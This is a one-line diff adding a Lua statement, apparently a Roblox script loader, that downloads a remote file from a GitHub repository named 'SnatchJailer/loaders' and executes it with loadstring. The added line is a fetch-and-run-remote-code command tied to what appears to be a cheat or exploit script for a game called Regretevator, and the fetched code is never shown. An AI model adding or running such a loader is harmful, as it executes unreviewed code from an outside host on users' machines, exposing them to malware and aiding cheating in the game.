@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SnatchJailer/loaders/main/loaders/regretevator-elevator-simulator-spam6-h292jvbio3twjp.lua"))()
